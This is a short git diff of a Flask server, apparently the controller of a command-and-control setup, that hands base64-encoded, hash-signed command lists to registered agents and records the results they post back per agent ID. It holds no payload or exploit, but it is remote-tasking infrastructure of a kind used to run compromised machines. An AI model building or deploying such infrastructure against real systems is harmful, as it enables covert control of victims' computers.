@@ -39,24 +39,35 @@ def register():
 
 
 
-@app.get("/<pid>/commands")
-def serve_commands(pid):
+@app.get("/<uid>/commands")
+def serve_commands(uid):
 	global agent_db
 	print(agent_db)
-	commands = agent_db[pid]["poll"] + "\n"
-	password = agent_db[pid]["password"]
-	for cmd in agent_db[pid]["commands"].keys():
+	commands = agent_db[uid]["poll"] + "\n"
+	password = agent_db[uid]["password"]
+	for cmd in agent_db[uid]["commands"].keys():
 		hashed = hashlib.sha256(f"{password}::{cmd}".encode("utf-8")).hexdigest()
 		commands += f"{password}::{cmd}::{hashed}\n"
 	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))
 
 
-@app.post("/data")
-def receive_data():
-	data = base64.urlsafe_b64decode(bytes(request.data))
-	print(str(data, "utf-8"))
-	return "", 200
+# @app.post("/data")
+# def receive_data():
+# 	data = base64.urlsafe_b64decode(bytes(request.data))
+# 	print(str(data, "utf-8"))
+# 	return "", 200
 
+@app.post("/<uid>/data")
+def recieve_data(uid):
+	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
+	command = data[0]
+	parameters = data[1]
+	result = data[2]
+	print(data)
+	global agent_db
+	agent_db[uid]["commands"][f"{command}::{parameters}"] = result
+	print(agent_db)
+	return "", 200
 
 def add_command(command, uid):
 	global agent_db
